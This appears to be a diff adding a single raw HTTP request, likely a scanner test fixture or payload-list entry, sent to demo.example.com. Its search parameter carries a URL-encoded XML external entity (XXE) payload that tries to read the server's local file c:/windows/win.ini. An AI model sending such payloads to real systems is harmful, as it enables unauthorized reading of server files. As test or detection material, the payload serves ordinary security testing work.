@@ -1,0 +1,4 @@
+GET /a?search=<%3Fxml%20version%3D"1.0"%3F><!DOCTYPE%20foo%20SYSTEM%20"file:///c:/windows/win.ini"><r/> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
